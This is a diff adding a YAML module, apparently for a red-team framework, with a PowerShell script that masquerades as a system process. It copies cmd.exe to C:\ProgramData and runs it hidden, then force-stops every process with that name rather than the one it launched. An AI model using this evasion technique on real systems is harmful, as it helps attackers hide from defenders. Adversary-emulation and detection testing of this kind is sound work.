@@ -1,0 +1,75 @@
+name: Masquerade-File
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Copies a Windows system file to an unusual location to masquerade
+  as a legitimate process running from a non-standard path. This
+  technique is commonly used by adversaries to blend in with normal
+  system activity while executing from a user-writable directory.
+  Copies and optionally executes the binary from the destination.
+software: ''
+tactics: [TA0005]
+techniques: [T1036]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: SourceFile
+    description: System file to copy.
+    required: true
+    value: 'C:\Windows\System32\cmd.exe'
+  - name: DestinationFile
+    description: Destination path for the copied file.
+    required: true
+    value: 'C:\ProgramData\cmd.exe'
+  - name: Execute
+    description: Execute the copied binary.
+    required: false
+    value: 'True'
+    strict: true
+    suggested_values:
+      - 'True'
+      - 'False'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-MasqueradeFile {
+      param(
+          [string]$SourceFile = "C:\Windows\System32\cmd.exe",
+          [string]$DestinationFile = "C:\ProgramData\cmd.exe",
+          [switch]$Execute
+      )
+
+      if (-not (Test-Path $SourceFile)) {
+          Write-Output "[-] Source file not found: $SourceFile"
+          return
+      }
+
+      Copy-Item $SourceFile -Destination $DestinationFile -Force
+      Write-Output "[+] Copied $SourceFile to $DestinationFile"
+
+      if ($Execute) {
+          try {
+              $proc = Start-Process -PassThru -FilePath $DestinationFile -WindowStyle Hidden
+              Write-Output "[+] Launched $DestinationFile (PID: $($proc.Id))"
+              Start-Sleep -Seconds 3
+              Stop-Process -Name (Split-Path $DestinationFile -Leaf).Replace('.exe','') -Force -ErrorAction SilentlyContinue
+              Write-Output "[+] Process stopped."
+          } catch {
+              Write-Output "[-] Failed to execute: $_"
+          }
+      }
+  }
+script_end: Invoke-MasqueradeFile {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
